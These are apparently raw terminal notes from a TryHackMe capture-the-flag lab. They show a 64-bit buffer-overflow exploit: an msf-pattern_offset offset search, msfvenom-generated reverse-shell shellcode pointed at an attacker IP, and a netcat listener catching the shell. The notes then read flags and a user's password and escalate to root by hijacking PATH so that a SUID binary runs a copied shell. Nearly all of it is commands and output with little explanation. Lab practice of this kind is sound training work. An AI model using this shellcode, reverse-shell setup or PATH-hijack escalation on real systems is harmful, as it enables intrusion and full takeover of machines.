+                                                                                   
+┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
+└─$ msf-pattern_offset -l 1000 -q 0x4134754133754132
+
+0x41 34 75 41 33 75 41 32
+
+
+"\x32\x41\x75\x33\x41\x75\x34\x41"
+
+
+
+[*] Exact match at offset 608
+
+
+
+┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.6.65.43 LPORT=4444 -b '\x00' -f python
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+Found 4 compatible encoders
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 119 (iteration=0)
+x64/xor chosen with final size 119
+Payload size: 119 bytes
+Final size of python file: 597 bytes
+buf =  b""
+buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
+buf += b"\xef\xff\xff\xff\x48\xbb\x4c\x9b\x0e\x15\xb8\x27\xce"
+buf += b"\x14\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
+buf += b"\x26\xb2\x56\x8c\xd2\x25\x91\x7e\x4d\xc5\x01\x10\xf0"
+buf += b"\xb0\x86\xad\x4e\x9b\x1f\x49\xb2\x21\x8f\x3f\x1d\xd3"
+buf += b"\x87\xf3\xd2\x37\x94\x7e\x66\xc3\x01\x10\xd2\x24\x90"
+buf += b"\x5c\xb3\x55\x64\x34\xe0\x28\xcb\x61\xba\xf1\x35\x4d"
+buf += b"\x21\x6f\x75\x3b\x2e\xf2\x60\x3a\xcb\x4f\xce\x47\x04"
+buf += b"\x12\xe9\x47\xef\x6f\x47\xf2\x43\x9e\x0e\x15\xb8\x27"
+buf += b"\xce\x14"
+  
+  
+payload is exploitBinex.py
+
+but we have to add it locally to machine, 
+
+and execute whithin
+
+./bof < <(python bo.py)
+  
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 4444       
+listening on [any] 4444 ...
+connect to [10.6.65.43] from (UNKNOWN) [10.10.62.36] 48182
+ls
+ls: cannot open directory '.': Permission denied
+whoami
+kel
+pwd
+/home/des
+cd ..
+ls
+des
+kel
+noentry
+tryhackme
+cd kel
+ls
+exe
+exe.c
+flag.txt
+cat flag.txt
+You flag is THM{buffer_overflow_in_64_bit}
+
+The user credential
+username: kel
+password: kelvin_74656d7065726174757265
+
+
+
+#3
+
+kel:kelvin_74656d7065726174757265
+
+
+
+
+
+kel@THM_exploit:~$ cat exe.c
+#include <unistd.h>
+
+void main()
+{
+	setuid(0);
+	setgid(0);
+	system("ps");
+}
+kel@THM_exploit:~$ gdb
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+(gdb) quit
+kel@THM_exploit:~$ gdb exe
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from exe...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /home/kel/exe 
+  PID TTY          TIME CMD
+ 1221 pts/0    00:00:00 bash
+ 1380 pts/0    00:00:00 gdb
+ 1382 pts/0    00:00:00 exe
+ 1386 pts/0    00:00:00 sh
+ 1387 pts/0    00:00:00 ps
+[Inferior 1 (process 1382) exited normally]
+(gdb) info register
+The program has no registers now.
+(gdb) 
+
+
+kel@THM_exploit:~$ cp /bin/sh /tmp/ps
+kel@THM_exploit:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kel@THM_exploit:~$ export PATH=/tmp:$PATH
+kel@THM_exploit:~$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kel@THM_exploit:~$ ./exe
+# whoami
+root
+# ls
+exe  exe.c  flag.txt
+# cat flag.txt
+You flag is THM{buffer_overflow_in_64_bit}
+
+The user credential
+username: kel
+password: kelvin_74656d7065726174757265
+# cd /root
+# ls
+root.txt
+# cat root.txt
+The flag: THM{SUID_binary_and_PATH_exploit}. 
+Also, thank you for your participation.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
